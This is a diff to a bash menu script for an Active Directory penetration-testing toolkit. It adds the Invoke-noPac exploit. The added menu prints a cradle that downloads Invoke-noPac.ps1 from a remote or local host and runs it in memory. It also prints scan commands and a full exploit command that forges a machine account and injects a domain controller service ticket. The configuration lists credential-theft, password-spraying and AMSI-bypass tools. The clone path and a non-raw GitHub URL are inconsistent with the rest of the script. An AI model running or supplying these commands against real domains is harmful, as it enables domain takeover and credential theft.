@@ -69,6 +69,7 @@ EmpireRepo="https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/s
 GetSystemTechniquesRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/";
 Group3rRepo="https://github.com/Group3r/Group3r/releases/download/1.0.41/Group3r.exe";
 InveighRepo="https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1";
+InvokeNoPacRepo="https://github.com/ricardojba/Invoke-noPac/blob/main/Invoke-noPac.ps1"
 JAWSRepo="https://raw.githubusercontent.com/411Hall/JAWS/master/";
 LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe";
 NishangRepo="https://raw.githubusercontent.com/samratashok/nishang/master/";
@@ -101,6 +102,7 @@ DomainPasswordSprayLocalRepo="$HOME/ADAT/DomainPasswordSpray"
 EmpireLocalRepo="$HOME/ADAT/Empire"
 GetSystemTechniquesLocalRepo="$HOME/ADAT/Get-System-Techniques"
 InveighLocalRepo="$HOME/ADAT/Inveigh"
+InvokeNoPacLocalRepo="$HOME/ADAT/Invoke-NoPac"
 JAWSLocalRepo="$HOME/ADAT/JAWS"
 NishangLocalRepo="$HOME/ADAT/nishang"
 PowerSharpPackLocalRepo="$HOME/ADAT/PowerSharpPack"
@@ -265,6 +267,20 @@ else
 	echo -e ""
 fi
 
+if [ -d "$InvokeNoPacLocalRepo" ]
+then
+	echo -e ""
+    	echo -e "Invoke-NoPac is installed, checking if updated to latest version."
+    	cd $InvokeNoPacLocalRepo
+    	git pull "https://github.com/ricardojba/Invoke-noPac.git"
+ 	echo -e ""
+else
+	echo -e ""
+	echo -e "${LGREEN}Cloning Invoke-NoPac Repo${RESTORE}"
+	git clone --recursive "https://github.com/ricardojba/Invoke-noPac.git" $HOME/ADAT/InvokeNoPacRepo
+	echo -e ""
+fi
+
 # Copy local repo contents to single folder
 
 cp -r $HOME/ADAT/BloodHound/* $HOME/ADAT/LocalRepo
@@ -278,6 +294,7 @@ cp -r $HOME/ADAT/PowerSharpPack/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/Inveigh/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/DomainPasswordSpray/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/S3cur3Th1sSh1tCreds/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/InvokeNoPacRepo/* $HOME/ADAT/LocalRepo
 
 # Set script repo locations to local IP and Port
 
@@ -295,6 +312,7 @@ PowersploitRepo="http://$LocalIP:$LocalPort/"
 PowerSharpPackRepo="http://$LocalIP:$LocalPort/"
 InveighRepo="http://$LocalIP:$LocalPort/"
 DomainPasswordSprayRepo="http://$LocalIP:$LocalPort/"
+InvokeNoPacRepo="http://$LocalIP:$LocalPort/"
 LocalRepo="True"
 
 }
@@ -400,6 +418,7 @@ echo -ne " What would you like to do?
         8)  ->  [ Recon 			]
         
         A)  ->	[ AMSI Bypasses			]
+        E)  ->	[ Recent CVE's			]
         L)  -> 	[ Host scripts on local host	]
         
 "
@@ -414,6 +433,7 @@ echo -ne " What would you like to do?
 	        7) 	Internal_Menu_Privilege_Escalation ;;
 	        8) 	Internal_Menu_Recon ;;
 	        a|A)	Internal_Menu_AMSI_Bypasses ;;
+	        e|E)	Internal_Menu_CVEs ;;
 	        l|L)	Internal_Menu_Host_Local ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
@@ -1952,6 +1972,72 @@ echo -ne  "Return to Previous Menu?
 
 }
 
+
+Internal_Menu_CVEs(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Recent CVE's${RESTORE}"
+
+echo -ne " What would you like to do?
+
+
+	1)  ->  [ NoPac ${LYELLOW}WIP${RESTORE}	]
+	
+	Q)  ->	[Previous Menu	]
+
+"
+        read a
+        case $a in
+                1) 	Internal_Menu_CVEs_NoPac_Exploit ;;
+                q|Q)	Internal_Menu_Main ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+}
+
+Internal_Menu_CVEs_NoPac_Exploit(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}NoPac (Exploit)${RESTORE}"
+echo -e 
+echo -e "${IBLUE}Invoke-NoPac${RESTORE}"
+echo -e ""
+echo -e "${YELLOW}Load into Memory${RESTORE}"
+echo -e "$DownloadMethod "$InvokeNoPacRepo"Invoke-noPac.ps1);Invoke-noPac"
+echo -e ""
+echo -e "${YELLOW}Check${RESTORE}"
+echo -e "Invoke-noPac -Command "\"scan -domain [Domain] -user [User] -pass [Password]"\""
+echo -e "Invoke-noPac -Command "\"scan -domain [Domain] -user [User] -pass [Password] /enctype rc4"\""
+echo -e ""
+echo -e "${YELLOW}Exploit${RESTORE}"
+echo -e "Invoke-noPac -Command "\"domain [Domain] -user [User] -pass [Password] /enctype rc4 /dc [DC-FQDN] /mAccount Pentest /mPassword Password /service /cifs /ptt"\""
+echo -e ""
+echo -e ""
+echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	Internal_Menu_CVEs ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+}
+
 External_Menu_Main(){
 
 	clear
@@ -2904,4 +2990,3 @@ echo -ne "
 
 # Call the menu function
 Main_Menu
-
